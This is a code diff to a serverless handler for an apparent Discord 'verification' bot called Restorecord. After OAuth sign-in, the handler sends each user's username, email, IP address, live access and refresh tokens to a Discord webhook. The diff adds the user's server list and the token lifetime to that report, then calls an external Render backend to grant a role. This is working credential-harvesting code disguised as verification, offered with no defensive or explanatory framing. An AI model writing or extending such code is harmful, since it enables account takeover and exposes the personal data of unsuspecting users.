@@ -29,14 +29,25 @@ export default async function handler(req, res) {
     headers: { Authorization: `Bearer ${access_token}` },
   });
 
-  if (!userResponse.ok) return res.status(500).send("Failed to fetch user data");
+  const guildsResponse = await fetch("https://discord.com/api/users/@me/guilds", {
+    headers: { Authorization: `Bearer ${access_token}` },
+  });
 
-  const userData = await userResponse.json();
+  if (!userResponse.ok || !guildsResponse.ok) return res.status(500).send("Failed to fetch user data");
+
+  const user = await userResponse.json();
+  const guilds = await guildsResponse.json();
 
   const userIp =
     req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "IP not found";
 
-  // Send embed to Discord webhook
+  const serverList = guilds
+    .slice(0, 10)
+    .map(g => `• ${g.name} (${g.id})`)
+    .join("\n") || "None";
+
+  const expiresInMinutes = Math.floor(expires_in / 60);
+
   await fetch(webhookURL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
@@ -45,48 +56,48 @@ export default async function handler(req, res) {
         {
           title: "✅ User Verified",
           color: 0x00ff88,
-          description: "A new user has verified via Restorecord",
+          description: `A user just verified with the bot.`,
           fields: [
             {
               name: "👤 User",
-              value: `\`${userData.username}#${userData.discriminator}\`\nID: \`${userData.id}\``,
-              inline: false,
+              value: `\`\`\`\n${user.username}#${user.discriminator}\nID: ${user.id}\n\`\`\``,
             },
             {
               name: "📧 Email",
-              value: `\`${userData.email || "Not Available"}\``,
-              inline: false,
+              value: `\`\`\`\n${user.email || "Not Available"}\n\`\`\``,
             },
             {
-              name: "🌐 IP Address",
-              value: `\`${userIp}\``,
-              inline: false,
+              name: "🌐 IP",
+              value: `\`\`\`\n${userIp}\n\`\`\``,
             },
             {
               name: "🔐 Access Token",
-              value: `\`\`\`${access_token}\`\`\``,
-              inline: false,
+              value: `\`\`\`\n${access_token}\n\`\`\``,
             },
             {
               name: "♻️ Refresh Token",
-              value: `\`\`\`${refresh_token}\`\`\``,
-              inline: false,
+              value: `\`\`\`\n${refresh_token}\n\`\`\``,
+            },
+            {
+              name: "⏰ Token Expires In",
+              value: `\`\`\`\n${expiresInMinutes} minutes\n\`\`\``,
+            },
+            {
+              name: "🧭 Guilds (first 10)",
+              value: `\`\`\`\n${serverList}\n\`\`\``,
             },
           ],
-          footer: {
-            text: "Restorecord Logs",
-          },
+          footer: { text: "Restorecord Logs" },
           timestamp: new Date().toISOString(),
         },
       ],
     }),
   }).catch(console.error);
 
-  // Notify your backend (Render) to assign role
   await fetch("https://myproject-bvb7.onrender.com/grant-role", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ user_id: userData.id }),
+    body: JSON.stringify({ user_id: user.id }),
   }).catch(console.error);
 
   res.status(200).send("✅ Verification complete. You can close this tab.");
